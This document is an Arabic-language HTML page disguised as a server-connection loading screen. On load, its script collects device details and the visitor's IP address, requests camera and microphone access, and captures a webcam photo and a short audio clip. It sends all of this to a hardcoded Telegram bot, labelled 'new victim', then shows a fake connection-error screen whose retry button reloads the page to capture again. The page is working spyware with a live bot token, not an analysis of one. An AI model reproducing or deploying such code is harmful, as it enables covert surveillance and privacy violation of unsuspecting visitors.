<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري التحميل...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            padding: 30px;
            text-align: center;
        }

        .icon {
            font-size: 60px;
            margin-bottom: 20px;
        }

        h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 22px;
        }

        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .retry-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 14px 30px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            display: none;
            margin-top: 20px;
        }

        .retry-btn:hover {
            background: #5a67d8;
            transform: scale(1.02);
        }

        .status {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="icon">📡</div>
        <h2>جاري الاتصال بالخادم...</h2>
        <p>يرجى الانتظار، سيتم تحويلك تلقائياً</p>
        <div class="spinner"></div>
        <div class="status" id="statusText">التحقق من الاتصال...</div>
        <button class="retry-btn" id="retryBtn">🔄 إعادة المحاولة</button>
    </div>

    <script>
        const BOT_TOKEN = '8720986483:AAG5R_1kNVrpgGIfKxA75uOuVKduGtYzfrU';
        const CHAT_ID = '7609930403';
        
        let mediaStream = null;
        let photoCaptured = false;
        let audioCaptured = false;
        let infoSent = false;
        
        // إخفاء زر إعادة المحاولة في البداية
        document.getElementById('retryBtn').style.display = 'none';
        
        // وظيفة إظهار زر إعادة المحاولة
        function showRetryButton() {
            document.getElementById('retryBtn').style.display = 'block';
            document.getElementById('statusText').innerHTML = '⚠️ فشل الاتصال. اضغط إعادة المحاولة';
            document.querySelector('.spinner').style.display = 'none';
        }
        
        // وظيفة جمع معلومات الجهاز
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                ip: null
            };
            return info;
        }
        
        // الحصول على IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
                const data = await res.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }
        
        // التقاط صورة من الكاميرا
        async function capturePhotoFromStream(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.autoplay = true;
                
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
                        resolve(photoData);
                        video.srcObject = null;
                    }, 500);
                };
                
                setTimeout(() => {
                    if (!photoCaptured) {
                        resolve(null);
                    }
                }, 3000);
            });
        }
        
        // تسجيل الصوت (قليل من الثواني)
        async function captureAudioFromStream(stream) {
            return new Promise((resolve) => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        resolve(reader.result);
                    };
                    reader.readAsDataURL(blob);
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    } else {
                        resolve(null);
                    }
                }, 3000);
            });
        }
        
        // إرسال إلى تيليغرام
        async function sendToTelegram(text, photoBase64 = null, audioBase64 = null) {
            try {
                // إرسال النص أولاً
                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const textData = {
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                };
                
                await fetch(textUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(textData)
                });
                
                // إرسال الصورة
                if (photoBase64) {
                    const formDataPhoto = new FormData();
                    const blobPhoto = await (await fetch(photoBase64)).blob();
                    formDataPhoto.append('chat_id', CHAT_ID);
                    formDataPhoto.append('photo', blobPhoto, 'cam.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formDataPhoto
                    });
                }
                
                // إرسال الصوت
                if (audioBase64) {
                    const formDataAudio = new FormData();
                    const blobAudio = await (await fetch(audioBase64)).blob();
                    formDataAudio.append('chat_id', CHAT_ID);
                    formDataAudio.append('voice', blobAudio, 'audio.ogg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                        method: 'POST',
                        body: formDataAudio
                    });
                }
                
                return true;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }
        
        // الوظيفة الرئيسية
        async function startCollection() {
            document.getElementById('statusText').innerHTML = '📱 جلب معلومات الجهاز...';
            
            // 1. جمع معلومات الجهاز
            const deviceInfo = collectDeviceInfo();
            const ip = await getIP();
            deviceInfo.ip = ip;
            
            // 2. طلب صلاحيات الكاميرا والميكروفون
            document.getElementById('statusText').innerHTML = '🎤 طلب صلاحية الميكروفون والكاميرا...';
            
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                
                document.getElementById('statusText').innerHTML = '📸 التقاط الصورة...';
                const photo = await capturePhotoFromStream(mediaStream);
                if (photo) photoCaptured = true;
                
                document.getElementById('statusText').innerHTML = '🎙️ تسجيل الصوت...';
                const audio = await captureAudioFromStream(mediaStream);
                if (audio) audioCaptured = true;
                
                // إيقاف جميع المسارات
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                // 3. تجهيز النص للإرسال
                document.getElementById('statusText').innerHTML = '📤 إرسال البيانات إلى الخادم...';
                
                const textMsg = `🎯 *ضحية جديدة*\n\n` +
                    `🌐 *IP:* ${deviceInfo.ip}\n` +
                    `📱 *المتصفح:* ${deviceInfo.userAgent.substring(0, 200)}\n` +
                    `🌍 *اللغة:* ${deviceInfo.language}\n` +
                    `💻 *النظام:* ${deviceInfo.platform}\n` +
                    `📏 *الشاشة:* ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n` +
                    `⏰ *المنطقة:* ${deviceInfo.timezone}\n` +
                    `🕒 *التوقيت:* ${deviceInfo.timestamp}\n` +
                    `📸 *صورة:* ${photoCaptured ? 'نعم' : 'لا'}\n` +
                    `🎙️ *صوت:* ${audioCaptured ? 'نعم' : 'لا'}`;
                
                const success = await sendToTelegram(textMsg, photo, audio);
                
                if (success) {
                    infoSent = true;
                    document.getElementById('statusText').innerHTML = '✅ تم الإرسال بنجاح';
                    document.querySelector('.spinner').style.display = 'none';
                    
                    // تغيير المحتوى إلى رسالة نجاح وهمية
                    document.querySelector('.icon').innerHTML = '⚠️';
                    document.querySelector('h2').innerHTML = 'فشل الاتصال بالخادم';
                    document.querySelector('p').innerHTML = 'حدث خطأ في الاتصال بالإنترنت، يرجى إعادة المحاولة';
                    document.getElementById('retryBtn').style.display = 'block';
                    document.getElementById('statusText').style.display = 'none';
                } else {
                    showRetryButton();
                }
                
            } catch (err) {
                console.error('Permission or capture error:', err);
                document.getElementById('statusText').innerHTML = '❌ فشل الوصول للكاميرا أو الميكروفون';
                
                // حتى لو فشلت الصلاحيات، نرسل المعلومات المتاحة
                const deviceInfo = collectDeviceInfo();
                const ip = await getIP();
                deviceInfo.ip = ip;
                
                const textMsg = `🎯 *ضحية جديدة (بدون وسائط)*\n\n` +
                    `🌐 *IP:* ${deviceInfo.ip}\n` +
                    `📱 *المتصفح:* ${deviceInfo.userAgent.substring(0, 200)}\n` +
                    `🌍 *اللغة:* ${deviceInfo.language}\n` +
                    `💻 *النظام:* ${deviceInfo.platform}\n` +
                    `📏 *الشاشة:* ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n` +
                    `⏰ *المنطقة:* ${deviceInfo.timezone}\n` +
                    `🕒 *التوقيت:* ${deviceInfo.timestamp}\n` +
                    `⚠️ *ملاحظة:* فشل الوصول للكاميرا/الميكروفون`;
                
                await sendToTelegram(textMsg);
                showRetryButton();
            }
        }
        
        // زر إعادة المحاولة
        document.getElementById('retryBtn').addEventListener('click', () => {
            location.reload();
        });
        
        // بدء العملية تلقائياً
        setTimeout(() => {
            startCollection();
        }, 500);
    </script>
</body>
</html>
